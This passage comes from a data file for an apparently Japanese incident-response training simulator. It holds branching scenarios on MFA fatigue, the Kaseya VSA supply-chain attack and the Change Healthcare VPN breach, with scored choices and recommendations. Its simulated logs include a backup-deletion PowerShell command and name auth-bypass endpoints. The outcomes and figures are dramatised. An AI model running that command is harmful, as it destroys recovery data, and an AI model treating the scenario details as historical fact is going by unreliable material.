        situationSummary: '知的財産の流出。未公開製品のソースコードが外部C2へ送信完了。',
        telemetryLogs: [
          { timestamp: '03:20:00', source: 'GitHub Enterprise', level: 'CRITICAL', message: 'git clone executed for 18 core proprietary repositories within 12 minutes' }
        ],
        choices: [
          {
            id: 'c2_revoke_all_ssh_git_keys',
            label: '全社VPN接続の全強制切断・GitHub全アクセストークンとSSH公開鍵の全件無効化',
            actionType: 'remediation',
            timeCostMinutes: 60,
            description: 'すべてのセッションを物理的に切断し、認証キーを総入れ替えする。',
            tacticalRationale: '手遅れではあるが、流出拡大を止めるための最低限の是正処置。',
            isOptimal: true,
            impact: { spread: 10, exfiltration: 20, downtime: 25, trust: -30 },
            logOutput: [
              '[VPN] All active sessions terminated globally.',
              '[GITHUB] All personal access tokens and SSH deploy keys revoked.'
            ],
            nextNodeId: 'mfa_03_terminal_breached_f'
          }
        ]
      },

      mfa_03_terminal_secured_s: {
        id: 'mfa_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】電撃セッション切断とナンバーマッチングMFAによる完勝',
        description: '深夜の「MFAプッシュ連打」というソーシャルエンジニアリングの兆候を見逃さず、直ちにセッション強制切断を実行して社内情報探索を水際で阻止しました。さらに「ナンバーマッチング（数値一致認証）」を全社強制することで、同様の攻撃を未来永劫不可能にしました。',
        severity: 'contained',
        situationSummary: '機密流出: ゼロ。特権侵害: ゼロ。最新MFA疲労攻撃の完封。',
        telemetryLogs: [
          { timestamp: '04:30:00', source: 'SOC Command', level: 'INFO', message: 'Incident resolved. Number matching active across 100% of workforce.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'MFA疲労攻撃（Prompt Bombing）に対する完璧な即応と恒久対策',
          summary: '「パスワード変更だけで安心せずアクティブセッションを確実に切断」「単純タップ承認を廃止しナンバーマッチングへ即時昇格」という現代アイデンティティ防御の鉄則を完遂しました。',
          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約35億円（特権Vault奪取およびソースコード流出時の想定損害）',
          legalImpact: '機密データ流出なし。報告義務・法的責任の完全クリア。',
          complianceStatus: 'CISA MFAガイダンス / NIST SP 800-63B AAL2 適合',
          recommendedPractices: [
            'プッシュ通知型のMFAは「ナンバーマッチング（数値一致）」を必須とし、単純な「承認」ボタンのみの運用は即刻廃止する',
            '短時間に連続するMFA失敗（例: 3回以上）でアカウントを自動一時ロックし、SOCへ高優先度アラートを発報する仕組みを導入する',
            '社内チャット（Slack/Teams）やWikiにAPIキーやパスワードを平文保存することを固く禁じ、自動スキャン（Secret Scanner）で検知・失効させる'
          ]
        }
      },

      mfa_03_terminal_breached_f: {
        id: 'mfa_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】深夜の油断が生んだ全社Slack掌握と特権情報完全陥落',
        description: '「深夜だから」と確認を後回しにしたり、パスワード変更だけでセッションを切断しなかった結果、攻撃者に社内チャットや特権管理サーバーを掌握され、全世界に侵入を宣言される屈辱的な大事故となりました。',
        severity: 'critical',
        situationSummary: '企業秘密の完全流出。社内コミュニケーションの崩壊と世界的報道。',
        telemetryLogs: [
          { timestamp: '05:00:00', source: 'Global Tech Media', level: 'CRITICAL', message: 'Viral leak: Screenshots of internal Slack and source code posted on Telegram' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: '人間の疲労を突いたソーシャルエンジニアリングの脅威',
          summary: 'MFAは万能ではなく、「承認ボタンを押してしまう人間心理」を防御するアーキテクチャ（ナンバーマッチング等）が欠如していたことが致命傷となりました。',
          financialEstimate: '被害損害額: 約28億円（顧客対応・外部調査費用・株価下落影響）',
          legalImpact: 'プライバシー規制当局による調査、取引先からの契約不履行責任追及。',
          complianceStatus: 'ISO 27001 / SOC 2 認証の一時停止',
          recommendedPractices: [
            '「セッションの強制破棄（Revoke Session）」を行わない限り、パスワードを変更しても攻撃者の通信は止まらないことをCSIRT全員に徹底教育する',
            '外部委託先の端末・アカウント管理を正社員と同等以上の基準で厳格化し、多要素認証のセキュリティレベルを統一する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_kaseya_msp',
    title: 'MSP統合運用基盤ゼロデイ侵入 & 下流顧客サプライチェーン一斉暗号化',
    subtitle: '実在モデル: 2021年 米国Kaseya VSAサプライチェーン攻撃 (REvil)',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'Cloud & Supply Chain',
    estimatedTime: '20分',
    initialNodeId: 'kaseya_01_alert',
    initialMetrics: {
      spread: 40,
      exfiltration: 20,
      downtime: 25,
      trust: 80,
    },
    briefing: {
      targetOrganization: 'マネージドITサービスプロバイダー (MSP)（中小企業・自治体・クリニック等 430社を受託運用）',
      discoveredAlert: 'MSP中央リモート監視管理サーバー [VSA-CENTRAL-01] にて、未認証のSQLインジェクション経由で管理者セッションが偽造され、全管理下エージェント端末宛てに「緊急セキュリティパッチ」と称するタスク（agent.exe / 暗号化ペイロード）が一斉配信されたのを検知。',
      incidentOfficer: 'MSP統括 CISO / 緊急対策本部長',
      immediateObjective: '中央管理サーバーの物理的ネットワーク遮断（Kill Switch）、全顧客企業への即時電源OFF/回線遮断エマージェンシーコールの発信、汚染アップデートパッケージの配信停止。',
    },
    imagePath: '/src/assets/images/scenario_kaseya_msp_1793938188219.jpg',
    nodes: {
      kaseya_01_alert: {
        id: 'kaseya_01_alert',
        phase: 'Phase 1: 中央運用基盤のハイジャック検知 (T+00:00)',
        title: '管理コンソールからの悪意あるパッチ自動一斉配信',
        description: '祝日連休初日の午前07時30分、MSPの中央運用管理サーバー [VSA-CENTRAL-01] にて、認証バイパス脆弱性を突いた攻撃者が侵入。正規の「エージェント自動アップデート機能」をハイジャックし、顧客430社が保有する約12,000台のPC・サーバー宛てにランサムウェア（Kaseya.agentpath.exe）を配布するタスクを一斉実行しました。',
        severity: 'critical',
        situationSummary: 'MSPの信頼された管理チャネルが悪用され、下流の顧客企業数百社で一斉暗号化が開始されかけています。',
        telemetryLogs: [
          { timestamp: '07:28:10', source: 'VSA Audit Log', level: 'CRITICAL', message: 'Admin session forged via Auth Bypass (dl.asp/setCookie.ashx). User: SYSTEM' },
          { timestamp: '07:29:45', source: 'VSA Task Engine', level: 'CRITICAL', message: 'Broadcast task "Kaseya VSA Hotfix Agent Update" queued for 12,480 endpoints' },
          { timestamp: '07:31:00', source: 'Client EDR Feed', level: 'ALERT', message: 'Endpoint [CL-HOSPITAL-SRV01] downloaded agent.exe; Windows Defender disabled via PowerShell' }
        ],
        choices: [
          {
            id: 'c1_hard_killswitch_broadcast_alert',
            label: '中央VSA管理サーバーのネットワーク回線を物理切断（Kill Switch発動）& 全顧客企業へ自動緊急一斉通報システムで「オンプレサーバー・PCの即時ネットワーク切断」を通達',
            actionType: 'containment',
            timeCostMinutes: 8,
            description: 'MSPの中央サーバーを即座にオフライン化して配信キューを物理的に絶ち、暗号化が完了していない顧客端末の回線を切らせて被害を水際で止める。',
            tacticalRationale: '最善の初動。サプライチェーン攻撃において管理基盤が掌握された場合、WebUIからのタスクキャンセルは効かない。中央サーバー自体の回線を物理遮断（Kill Switch）して配信を強制停止し、顧客へ即時回線切断をブロードキャストすることが最大の被害抑止となる。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 15, trust: 0 },
            logOutput: [
              '[DATA CENTER] Uplink cables pulled from VSA-CENTRAL-01. Server is offline.',
              '[EMERGENCY BROADCAST] Automated SMS & phone call alert dispatched to IT leads at all 430 client organizations.',
              '[OUTCOME] 350+ client organizations immediately isolated their local networks, stopping payload execution.'
            ],
            nextNodeId: 'kaseya_02_containment_and_remediation'
          },
          {
            id: 'c1_cancel_web_task',
            label: 'VSA管理コンソールのWeb画面から「タスクの一括キャンセル」をクリックし、ジョブが止まるか様子を見る',
            actionType: 'containment',
            timeCostMinutes: 25,
            description: 'WebUI上の操作で配信タスクの停止を試みる。',
            tacticalRationale: '最悪の悪手。攻撃者はすでにVSAサーバーのバックエンドプロセスを掌握しており、WebUIのキャンセル命令は無視されるか遅延する。その25分の間に数万台のクライアントが暗号化される。',
            impact: { spread: 45, exfiltration: 25, downtime: 35, trust: -35 },
            logOutput: [
              '[VSA UI] Task cancellation queued... Request timeout (504 Gateway Timeout).',
              '[PAYLOAD] Ransomware payload executed on 8,900 endpoints across 280 client companies!',
              '[HELP-DESK] Customer support phones ringing off the hook with outage reports.'
            ],
            nextNodeId: 'kaseya_02_mass_outbreak'
          },
          {
            id: 'c1_deny_involvement',
            label: '「自社サーバーの誤検知かもしれない」と判断し、事実関係の社内調査が完了するまで顧客への連絡を伏せる',
            actionType: 'investigation',
            timeCostMinutes: 60,
            description: '風評被害を恐れて顧客への警告を遅らせる。',
            tacticalRationale: '致命的過失。顧客企業のバックアップまで暗号化され、病院や自治体などの業務が完全停止。後に隠蔽工作として刑事・民事責任を厳しく問われる。',
            impact: { spread: 55, exfiltration: 40, downtime: 50, trust: -55 },
            logOutput: [
              '[MEDIA BREAKING] National news reports 400+ businesses hit by ransomware simultaneously through MSP provider.',
              '[LEGAL ACTION] Class action lawsuit filed by affected dental clinics and municipal offices.'
            ],
            nextNodeId: 'kaseya_02_client_collapse'
          }
        ]
      },

      kaseya_02_containment_and_remediation: {
        id: 'kaseya_02_containment_and_remediation',
        phase: 'Phase 2: クライアント隔離支援 & 復旧ツール展開 (T+01:00)',
        title: '現地オンサイト部隊の派遣とオフライン復旧支援',
        description: '中央サーバー切断と緊急アラートにより、全体の約80%のクライアント端末がペイロード実行前にネットワークから切り離され、暗号化を回避。しかし約70社の一部端末で暗号化が開始されているため、緊急復旧レスポンス部隊を編成し、各社バックアップの健全性確認が必要です。',
        severity: 'high',
        situationSummary: '拡散は阻止。被害に遭った70社のオフラインバックアップ検証と復旧支援に全リソースを投入する。',
        telemetryLogs: [
          { timestamp: '08:30:00', source: 'Crisis Command', level: 'INFO', message: '360 client companies confirmed 100% safe. 70 clients report partial workstation impact' },
          { timestamp: '08:45:12', source: 'CISA / FBI', level: 'INFO', message: 'CISA advisory on Kaseya supply chain compromise received; joint triage room opened' }
        ],
        choices: [
          {
            id: 'c2_dispatch_ir_restore_backups',
            label: '全技術社員を復旧レスポンス隊として被害70社へ緊急現地派遣・イミュータブルバックアップからの無償復旧代行とゼロデイパッチ検証',
            actionType: 'remediation',
            timeCostMinutes: 90,
            description: '被害企業に駆けつけてオフラインバックアップから端末を迅速にクリーンリストアし、事業停止時間を最短化する。',
            tacticalRationale: 'MSPとしての社会的責任を果たす最善策。迅速な人的支援と無償復旧を提供することで、信頼の完全失墜を防ぎ、顧客企業の事業を救済する。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -5, downtime: 10, trust: +20 },
            logOutput: [
              '[FIELD TEAMS] 45 mobile engineering units dispatched with clean OS installation media.',
              '[RESTORATION] Clean restore verified from offline immutable backups for 65 out of 70 affected clients within 24 hours.',
              '[PATCH] VSA zero-day patch applied in isolated sandbox environment.'
            ],
            nextNodeId: 'kaseya_03_terminal_secured_s'
          }
        ]
      },

      kaseya_02_mass_outbreak: {
        id: 'kaseya_02_mass_outbreak',
        phase: 'Phase 2: 280社同時暗号化と身代金恐喝 (T+02:30)',
        title: '顧客企業280社での一斉暗号化と7,000万ドルの身代金要求',
        description: 'Web操作による遅れにより、280社・約8,900台のPCとサーバーが暗号化されました。攻撃者集団「REvil」はダークウェブ上に「全顧客の復号キーを7,000万ドルのビットコインで一括提供する」との声明を発表。顧客企業からは怒りの電話と損害賠償通告が殺到しています。',
        severity: 'critical',
        situationSummary: '未曾有の大惨事。顧客280社の業務が停止し、巨額の身代金恐喝に直面。',
        telemetryLogs: [
          { timestamp: '10:00:00', source: 'REvil Happy Blog', level: 'CRITICAL', message: 'Universal decryptor available for 70 Million USD. Timer set to 72 hours.' },
          { timestamp: '10:15:00', source: 'Client Hospital', level: 'CRITICAL', message: 'Patient admissions suspended due to electronic health record encryption' }
        ],
        choices: [
          {
            id: 'c2_fbi_joint_taskforce_triage',
            label: '身代金支払いを拒絶・FBIおよび警察庁サイバー特別捜査隊との合同タスクフォース設置・全社バックアップ救出作戦',
            actionType: 'communication',
            timeCostMinutes: 120,
            description: '公的機関と連携し、ダークウェブ交渉ではなく法執行機関の暗号解読支援と手動バックアップ復旧にかける。',
            tacticalRationale: '身代金支払いはテロ・サイバー犯罪組織への資金供与となり、復号も保証されない。法執行機関との連携が唯一の打開策。',
            isOptimal: true,
            impact: { spread: 15, exfiltration: 20, downtime: 45, trust: -40 },
            logOutput: [
              '[TASKFORCE] Joint operation room established with federal cyber investigators.',
              '[DECRYPTION] Law enforcement obtains master decryption keys from seized backend server 3 weeks later.'
            ],
            nextNodeId: 'kaseya_03_terminal_breached_f'
          }
        ]
      },

      kaseya_02_client_collapse: {
        id: 'kaseya_02_client_collapse',
        phase: 'Phase 2: 顧客企業の連鎖倒産と刑事捜査着手 (T+04:00)',
        title: '情報隠蔽の発覚と顧客企業の連鎖倒産',
        description: '事実確認を優先して顧客への警告を怠った結果、顧客企業各社のオフラインバックアップまで暗号化が到達。医療機関の救急受け入れ停止、サプライチェーン停止による部品メーカーの倒産が相次ぎ、監督官庁および検察による強制捜査が開始されました。',
        severity: 'critical',
        situationSummary: '壊滅的事態。企業の刑事責任追及と破産申し立て。',
        telemetryLogs: [
          { timestamp: '11:30:00', source: 'Prosecutor Office', level: 'CRITICAL', message: 'Search warrant executed at MSP headquarters for gross negligence.' }
        ],
        choices: [
          {
            id: 'c2_surrender_bankruptcy',
            label: '破産管財人の選定と全受託事業の公的機関への引き継ぎ',
            actionType: 'communication',
            timeCostMinutes: 180,
            description: '法的整理に入り、顧客企業の救済を公的管財人に委ねる。',
            tacticalRationale: '破綻後の最終手続き。',
            isOptimal: true,
            impact: { spread: 30, exfiltration: 30, downtime: 60, trust: -60 },
            logOutput: [
              '[COURT] Bankruptcy petition accepted.',
              '[CISO] Formal testimony before Parliamentary Committee on Supply Chain Security.'
            ],
            nextNodeId: 'kaseya_03_terminal_breached_f'
          }
        ]
      },

      kaseya_03_terminal_secured_s: {
        id: 'kaseya_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】物理Kill Switchと緊急一斉架電によるサプライチェーン防衛',
        description: '中央管理サーバーの「物理ネットワーク切断（Kill Switch）」を躊躇なく断行し、全顧客への自動緊急一斉通報により、全体の80%以上の顧客企業を暗号化から死守しました。さらに技術社員の現地派遣による迅速なバックアップ復旧でMSPとしての信頼を回復しました。',
        severity: 'contained',
        situationSummary: '80%以上の顧客を無傷で防衛。被害顧客も24時間以内に全台クリーン復旧。',
        telemetryLogs: [
          { timestamp: '14:00:00', source: 'MSP Incident Command', level: 'INFO', message: 'All 430 clients audited. Clean state restored. Universal zero-day patch verified.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'MSPサプライチェーン攻撃に対する迅速果断な危機対応',
          summary: '「Web操作に頼らず大元の回線を物理切断する」「隠蔽せず全顧客へ直ちに警戒アラートを発報する」というサプライチェーン管理者の鑑となる初動を完遂しました。',
          financialEstimate: '被害損害額: 約1億5,000万円（現地派遣復旧費・緊急対策費） / 阻止損失額: 約180億円（430社全体の損害賠償・集団訴訟）',
          legalImpact: '顧客への即時通報義務を完全に遵守。行政指導を回避。',
          complianceStatus: 'サプライチェーン・サイバーセキュリティ・コンソーシアム (SC3) 模範事例認定',
          recommendedPractices: [
            'MSP中央管理サーバーには、異常時にインターネットおよび全顧客との通信を即時遮断できる「物理的/論理的Kill Switch」を常備する',
            '中央サーバーからエージェントへのスクリプト・バイナリ配信には「複数管理者によるコード署名（Dual Signing）」を義務付け、単一サーバー侵害での一斉配信を阻止する',
            '顧客企業のバックアップはMSPの管理網から独立した「イミュータブル（変更不可）・オフライン」構成とし、管理基盤が陥落してもバックアップを破壊されない設計にする'
          ]
        }
      },

      kaseya_03_terminal_breached_f: {
        id: 'kaseya_03_terminal_breached_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】管理基盤の盲信と通報遅延が生んだサプライチェーン壊滅事故',
        description: 'WebUI上でのキャンセル操作に固執したり、顧客への連絡を躊躇した結果、顧客企業280社・数万台のシステムが一斉暗号化される未曾有のサイバー大惨事となりました。巨額の賠償請求と刑事責任により、MSP企業は破滅的な結末を迎えました。',
        severity: 'critical',
        situationSummary: '数百社の顧客業務麻痺。7,000万ドルの身代金要求と企業の破綻。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'Regulatory Authority', level: 'CRITICAL', message: 'Operating license revoked. Criminal investigation referred to Ministry of Justice.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'サプライチェーンのハブが最凶の感染源と化した悲劇',
          summary: '「管理サーバーが乗っ取られた際の強制切断手順」の欠如と、「顧客への通報遅れ」が致命的な被害拡大を引き起こしました。',
          financialEstimate: '被害損害額: 約85億円（顧客損害賠償・法的和解金・廃業清算費用）',
          legalImpact: '業務上過失および善管注意義務違反による巨額民事訴訟、刑事告訴。',
          complianceStatus: '全セキュリティ認定失効・廃業',
          recommendedPractices: [
            '「自社が攻撃の踏み台にされた時、最優先すべきは顧客のシステム停止（被害極小化）である」という倫理原則を全社規程に明記する',
            '平時から顧客連絡用の緊急一斉通報（電話・SMS・外部回線）システムを整備し、年1回以上の抜き打ち遮断訓練を実施する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_change_vpn',
    title: '単一要素認証（MFAなし）レガシーVPN突破 & 医療・基幹インフラ麻痺',
    subtitle: '実在モデル: 2024年 米国医療最大手 Change Healthcare / Colonial Pipeline 侵害事件 (ALPHV/BlackCat)',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'Ransomware',
    estimatedTime: '20分',
    initialNodeId: 'vpn_01_alert',
    initialMetrics: {
      spread: 35,
      exfiltration: 25,
      downtime: 30,
      trust: 85,
    },
    briefing: {
      targetOrganization: '全国医療保険請求ネットワーク & 電子カルテ連携クラウド企業（年間150億件の医療トランザクション処理）',
      discoveredAlert: '買収前の旧システムから運用が継続されていた旧Citrix/VPNポータル [legacy-vpn.portal.internal] において、ブルートフォース攻撃により漏洩認証情報が合致し、管理者アカウントでのリモートデスクトップログインが成功。直後にバックアップサーバー（Veeam）への消去コマンドが投入されたのを検知。',
      incidentOfficer: '最高情報セキュリティ責任者 (CISO)',
      immediateObjective: 'レガシーVPNゲートウェイの即時完全遮断、基幹決済・医療請求APIの安全な緊急分離、イミュータブル（変更不可）バックアップの死守、ランサムウェア身代金要求（2,200万ドル）への毅然とした拒絶とBCP（業務継続計画）発動。',
    },
    imagePath: '/src/assets/images/scenario_change_vpn_1793938201040.jpg',
    nodes: {
      vpn_01_alert: {
        id: 'vpn_01_alert',
        phase: 'Phase 1: MFA未設定レガシーポータルでの特権侵入検知 (T+00:00)',
        title: '単一要素認証ポータルへの侵入とVeeamバックアップ破壊工作',
        description: '未明03時12分、旧グループ会社から統合されず残存していた旧VPNポータル [legacy-vpn.portal.internal] に対し、ダークウェブ流出パスワードを用いたログインが成功。多要素認証（MFA）が設定されていなかったため直接侵入を許し、攻撃者はActive Directory管理者権限を即座に奪取。バックアップサーバー（Veeam Backup & Replication）のボリューム削除コマンドを実行し始めました。',
        severity: 'critical',
        situationSummary: '攻撃者は暗号化の前にバックアップを消去し、復旧の術を絶とうとしています。医療請求処理システムへの横展開が秒読み。',
        telemetryLogs: [
          { timestamp: '03:12:04', source: 'Citrix Gateway Log', level: 'CRITICAL', message: 'Auth Success: user=domain_admin_legacy from IP 185.220.101.5 (TOR). MFA: NOT_CONFIGURED' },
          { timestamp: '03:14:22', source: 'Veeam Backup SRV', level: 'CRITICAL', message: 'PowerShell command: Remove-VBRBackup -Backup (All) -Confirm:$false executed!' },
          { timestamp: '03:15:00', source: 'CrowdStrike EDR', level: 'ALERT', message: 'BlackCat / ALPHV ransomware encryptor dropped on Domain Controller DC-02' }
        ],
        choices: [
          {
            id: 'c1_sever_legacy_vpn_immutable',
            label: 'レガシーVPNゲートウェイのIP/DNSを即時物理遮断 & バックアップストレージのオフラインイミュータブル（WORM）スナップショット保護を緊急発動',
            actionType: 'containment',
            timeCostMinutes: 6,
            description: '侵入経路となったレガシーVPN機器の電源・回線を即断。さらにクラウド保管のオブジェクトロック（変更不可設定）バックアップを切り離して復旧資産を死守する。',
            tacticalRationale: '最善の初動。Change Healthcareの悲劇は「MFAのない単一ポータル」から始まりました。侵入経路を即座に遮断し、Veeamの削除コマンドから変更不可（Immutable）ストレージを保護することが、身代金支払いを拒絶して自力復旧するための唯一の前提条件となります。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 10, trust: +5 },
            logOutput: [
              '[NETWORK] Legacy Citrix VPN appliance disconnected from core switch.',
              '[STORAGE] AWS S3 Object Lock (WORM compliance mode) verified intact for all database backups.',
              '[EDR] Host WKSTN-LEGACY-01 isolated. Encryption process killed on DC-02.'
            ],
            nextNodeId: 'vpn_02_containment_and_claims_bcp'
          },
          {
            id: 'c1_change_admin_pw_only',
            label: '侵入された管理者アカウントのパスワードのみを変更し、レガシーポータル自体は病院顧客のために稼働させたままにする',
            actionType: 'containment',
            timeCostMinutes: 20,
            description: 'ポータルを止めると全国の病院からクレームが来るため、パスワード変更だけで済ませようとする。',
            tacticalRationale: '致命的ミス。攻撃者は侵入直後に複数のバックドアアカウントを作成し、ドメイン全体に黄金チケット（Golden Ticket）を発行しているため、1つのパスワードを変えても侵入は止まらない。',
            impact: { spread: 40, exfiltration: 30, downtime: 25, trust: -25 },
            logOutput: [
              '[AD] Password changed for domain_admin_legacy.',
              '[ATTACKER] Kerberos Golden Ticket used to authenticate as hidden admin: adm_svc_backup.',
              '[RANSOMWARE] Lateral movement completed to 4,200 virtual machines across national hospital network.'
            ],
            nextNodeId: 'vpn_02_hospital_grid_collapse'
          },
          {
            id: 'c1_negotiate_ransom_early',
            label: '医療停止の社会的影響を恐れ、攻撃者ダークウェブチャットへ直ちにアクセスして身代金支払い交渉を始める',
            actionType: 'communication',
            timeCostMinutes: 45,
            description: '自力復旧を諦め、犯罪組織への早期身代金支払いで解決を図る。',
            tacticalRationale: '壊滅的判断。Change Healthcareでは2,200万ドル（約34億円）の身代金を支払ったにもかかわらず、ランサムウェアグループ内部で仲間割れが起き、別グループから更なる二重恐喝を受けるという最悪の結末を辿った。',
            impact: { spread: 35, exfiltration: 45, downtime: 40, trust: -40 },
            logOutput: [
              '[TOR CHAT] Adversary demands 22 Million USD in Bitcoin.',
              '[THREAT INTEL] BlackCat affiliate declares they will leak 4 Terabytes of patient health records regardless of payment.'
            ],
            nextNodeId: 'vpn_02_double_extortion_disaster'
          }
        ]
      },

      vpn_02_containment_and_claims_bcp: {
        id: 'vpn_02_containment_and_claims_bcp',
        phase: 'Phase 2: 医療請求BCP発動 & シャドーポータル全廃 (T+01:00)',
        title: 'オフライン復旧計画の発動と全リモートアクセスMFA強制棚卸し',
        description: 'イミュータブルバックアップの死守に成功したため、身代金を支払わずに自力で基幹DBを復旧できる見通しが立ちました。しかし全米/全国の薬局・病院で保険請求が一時停止しているため、医療機関向けの紙代替・暫定融資BCPの即時公表と、社内に潜む残存レガシーポータルの全廃が必要です。',
        severity: 'high',
        situationSummary: 'データ破壊は阻止。医療機関の資金ショート・薬局調剤停止を防ぐための緊急BCP運用支援が焦点。',
        telemetryLogs: [
          { timestamp: '04:15:00', source: 'CISO Office', level: 'INFO', message: 'Attack surface discovery: Identified 3 other forgotten single-factor legacy portals' },
          { timestamp: '04:30:22', source: 'Ministry of Health / HHS', level: 'WARN', message: 'Emergency funding bridge protocol activated for impacted hospitals' }
        ],
        choices: [
          {
            id: 'c2_execute_clean_rebuild_mfa',
            label: '変更不可バックアップからの安全なクリーン再構築・社内全アクセスへの耐フィッシングMFA（FIDO2）強制・医療機関向け緊急支援窓口の24時間稼働',
            actionType: 'remediation',
            timeCostMinutes: 80,
            description: '侵害されたインフラを破棄して健全なバックアップから安全環境へ再構築。すべての旧ポータルを完全撤去し、医療機関への影響を最小限に抑える。',
            tacticalRationale: '基幹インフラ事業者の矜持を示す模範的対応。犯罪組織に一切屈することなく、イミュータブルバックアップから安全に復旧させ、セキュリティガバナンスを根本から立て直す。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -10, downtime: 15, trust: +20 },
            logOutput: [
              '[CLEAN RESTORE] Core medical transaction database restored from S3 Immutable Vault.',
              '[DECOMMISSION] All 4 legacy Citrix/VPN portals wiped and permanently decommissioned.',
              '[MFA POLICY] FIDO2 hardware tokens enforced for 100% of employees and contractors.'
            ],
            nextNodeId: 'vpn_03_terminal_secured_s'
          }
        ]
      },

      vpn_02_hospital_grid_collapse: {
        id: 'vpn_02_hospital_grid_collapse',
        phase: 'Phase 2: 全国病院・調剤薬局の全面機能停止 (T+03:00)',
        title: '4,200台暗号化と全国医療ネットワークの大停電',
        description: 'パスワード変更だけの不十分な対応により、攻撃者は社内全域にランサムウェアを展開。全国数千の病院・調剤薬局で保険資格確認や処方箋発行ができなくなり、がん患者の抗がん剤投与が遅延するなど人命に関わる深刻な医療麻痺が発生しました。',
        severity: 'critical',
        situationSummary: '国家的人道危機。医療インフラ全面停止、連邦政府による緊急事態宣言。',
        telemetryLogs: [
          { timestamp: '06:15:00', source: 'Hospital Network', level: 'CRITICAL', message: 'Over 8,000 pharmacies unable to process prescription co-pays. Patients turned away.' },
          { timestamp: '06:30:00', source: 'Federal Government', level: 'CRITICAL', message: 'National Security Council convenes emergency session on critical healthcare disruption' }
        ],
        choices: [
          {
            id: 'c2_federal_takeover_crisis',
            label: '政府サイバー防衛隊の介入受諾・非常時紙マニュアルの全国配布・損害賠償基金の設立',
            actionType: 'communication',
            timeCostMinutes: 120,
            description: '公的救済を要請し、人命救助を最優先としてシステム再建を進める。',
            tacticalRationale: '国家レベルの危機における最終対応。',
            isOptimal: true,
            impact: { spread: 15, exfiltration: 25, downtime: 50, trust: -45 },
            logOutput: [
              '[DOD/CISA] Federal cyber incident response team takes over network forensics.',
              '[EMERGENCY FUND] 2 Billion USD loan facility established to keep bankrupt hospitals afloat.'
            ],
            nextNodeId: 'vpn_03_terminal_breached_f'
          }
        ]
      },

      vpn_02_double_extortion_disaster: {
        id: 'vpn_02_double_extortion_disaster',
        phase: 'Phase 2: 身代金支払い後の仲間割れと再恐喝 (T+04:00)',
        title: '34億円支払い後の復号ツール不全と第二の恐喝グループ出現',
        description: '裏ルートで2,200万ドルの身代金を支払ったものの、提供された復号ツールは動作が極めて不安定でデータベースが破損。さらに身代金を受け取ったアフィリエイトとグループ幹部が仲間割れを起こし、別の攻撃者が「データはまだ手元にある」として追加で1,000万ドルを再要求してきました。',
        severity: 'critical',
        situationSummary: '身代金支払いの最悪の末路。資金強奪、データ復旧失敗、再度の恐喝。',
        telemetryLogs: [
          { timestamp: '07:15:00', source: 'Decryption Tool', level: 'CRITICAL', message: 'Decryption failed: CRC32 checksum mismatch on 60% of database blocks' },
          { timestamp: '07:30:00', source: 'Ransom Group B', level: 'CRITICAL', message: 'New threat actor: "ALPHV scammed you. We have the real 4TB data. Pay 10 Million or leak starts."' }
        ],
        choices: [
          {
            id: 'c2_terminate_talks_rebuild_scratch',
            label: '全交渉の即時打ち切り・FBIへの全通信記録提出・手動バックアップからのゼロスクラッチ再構築',
            actionType: 'remediation',
            timeCostMinutes: 150,
            description: '犯罪者との交渉がいかに無意味かを悟り、莫大な時間とコストをかけて自力再建に切り替える。',
            tacticalRationale: '遅すぎた決断だが、泥沼の再恐喝から脱却する唯一の方法。',
            isOptimal: true,
            impact: { spread: 20, exfiltration: 30, downtime: 60, trust: -55 },
            logOutput: [
              '[FBI] All cryptocurrency wallet transaction flows and chat logs handed over.',
              '[REBUILD] Bare-metal system reconstruction commenced from cold-storage archives.'
            ],
            nextNodeId: 'vpn_03_terminal_breached_f'
          }
        ]
      },

      vpn_03_terminal_secured_s: {
        id: 'vpn_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】レガシーVPN即断とイミュータブルバックアップ死守による自力復旧',
        description: 'MFA未設定の旧Citrixポータルという「組織の盲点」からの侵入に対し、躊躇なく回線を物理切断。さらに暗号化を許さないイミュータブル（WORM）バックアップを死守したことで、巨額の身代金支払いを1円も行わず、自力での基幹医療インフラ再建を成し遂げました。',
        severity: 'contained',
        situationSummary: '身代金支払い: ゼロ。イミュータブルバックアップから完全自力復旧達成。',
        telemetryLogs: [
          { timestamp: '10:00:00', source: 'CISO Incident Command', level: 'INFO', message: 'Healthcare transaction network fully restored. Zero-Trust FIDO2 enforced globally.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '重要インフラにおけるランサムウェア侵入の模範的封じ込めと強靭性（Resilience）',
          summary: '「侵入経路の即時物理切断」「イミュータブルバックアップによる身代金拒絶」「全シャドーITの完全廃止」という最高レベルのインシデント指揮を完遂しました。',
          financialEstimate: '被害損害額: 約1億8,000万円（復旧工数・臨時体制費） / 阻止損失額: 約1,400億円（Change Healthcareが被った身代金・復旧費・医療貸付支援の合計損失）',
          legalImpact: '個人情報保護法およびHIPAA法に基づく開示義務を遵守。刑事・民事責任を回避。',
          complianceStatus: 'NIST CSF v2.0 / FISC 安全対策基準 適合',
          recommendedPractices: [
            'M&A（企業の合併・買収）で引き継いだ旧インフラやレガシーVPNは放置せず、統合前に全ポータルへMFAを即時強制適用するか即刻廃止する',
            'バックアップは管理者アカウントであっても消去・改ざんできない「イミュータブル（WORM / オブジェクトロック）ストレージ」に保管する',
